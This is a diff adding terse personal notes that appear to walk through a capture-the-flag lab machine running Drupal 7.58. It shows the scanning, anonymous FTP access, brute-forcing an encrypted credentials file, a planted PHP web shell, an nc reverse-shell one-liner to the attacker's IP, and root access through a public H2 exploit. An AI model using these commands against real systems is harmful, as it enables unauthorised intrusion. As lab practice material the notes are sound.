@@ -1,0 +1,70 @@
+1.nmap automator --> 
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.5
+|      Logged in as ftp                                                                                                                                                 
+|      TYPE: ASCII                                                                                                                                                      
+|      No session bandwidth limit                                                                                                                                       
+|      Session timeout in seconds is 300                                                                                                                                
+|      Control connection is plain text                                                                                                                                 
+|      Data connections will be plain text                                                                                                                              
+|      At session startup, client count was 1                                                                                                                           
+|      vsFTPd 3.0.3 - secure, fast, stable                                                                                                                              
+|_End of status                                                                                                                                                         
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
+|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
+|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+2.checking port 80 first.
+3.it's is a drupal website. --> checking robots.txt 
+4.from this -->http://10.10.10.102/CHANGELOG.txt we got the drupal verion --> Drupal 7.58
+5.let's check for any exploit first --> https://www.exploit-db.com/exploits/44542
+6.But it requires authentication of the user for that, let's check default credentials first on the login page
+7.ftp anonymous login --> anonymous:anonymous
+8.using command -->  file .drupal.txt.enc  we found out it's a salted hash with base64 encoded -->
+.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded
+9.let's first decode it with base64 --> cat .drupal.txt.enc | base64 --decode > drupal.txt.enc.decoded
+10.let's brute force the openssl encrypted file 
+11. Tool -->sudo apt-get install bruteforce-salted-openssl
+12.bruteforce-salted-openssl -f /usr/share/wordlists/rockyou.txt drupal.txt.enc.decoded
+this showed the sha is 256
+13.bruteforce-salted-openssl -d sha256 -f /usr/share/wordlists/rockyou.txt drupal.txt.enc.decoded
+got password --> friends
+14.deoding the file using open-ssl --> openssl aes-256-cbc -d -in drupal.txt.enc.decoded -out drupal.txt
+-->the digest is SHA256 and cipher used is AES-256-CBC because that’s the default cipher that the program uses if it’s not specified
+15.got username and password --> Daniel:PencilKeyboardScanner123
+16.let's login into the portal --> tried ssh didn't work
+17.It throws an error --> I used admin:PencilKeyboardScanner123
+18. we have logedin
+19.from modules turn on php filter --> 
+20.add a new content and add this in the body --> <?php system($_GET['cmd']); ?> --> make sure to save the file with php.
+21.access this -->http://10.10.10.102/node/1?cmd=whoami and we got www-data
+22.let's get a reverse shell using burp --> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ncat
+payload nc shell--> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4242 >/tmp/f
+23.we got shell as www-data
+24.got user flag'
+25.for privelege escalation let's send LinEnum.sh using python server and wget 
+executing permissions --> chmod +x LinEnum.sh
+26.we saw this :
+root        804  0.0  0.0   4628   800 ?        Ss   16:39   0:00 /bin/sh -c /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar
+27. As we know 8082 is running h2, let's have a look at it --> It only allows local connections.
+28.Googled https://www.exploit-db.com/exploits/45506 
+29.sending the exploit --> to the machine -->
+python3 45506.py -H 127.0.0.1:8082 
+30.got root
+31.got root flag
